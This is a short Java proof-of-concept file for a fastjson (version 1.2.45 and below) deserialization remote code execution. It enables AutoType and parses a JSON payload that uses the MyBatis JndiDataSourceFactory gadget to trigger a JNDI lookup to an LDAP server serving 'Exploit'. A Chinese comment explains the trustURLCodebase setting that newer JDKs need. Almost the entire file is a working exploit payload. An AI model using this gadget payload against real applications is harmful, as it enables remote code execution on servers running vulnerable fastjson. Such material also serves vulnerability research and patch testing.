package com.test.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 *
 *fastjson <= 1.2.45 RCE，需要开启AutoType
 *高版本JEP290后需开启：System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
 */

public class JndiDataSourceFactory {

    public static void main(String[] args) {

        //        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");

        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

        String payload = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://127.0.0.1:1389/Exploit\"}}";
        try {
            JSON.parseObject(payload);
        }catch (Exception e){
            e.printStackTrace();
        }

    }
}
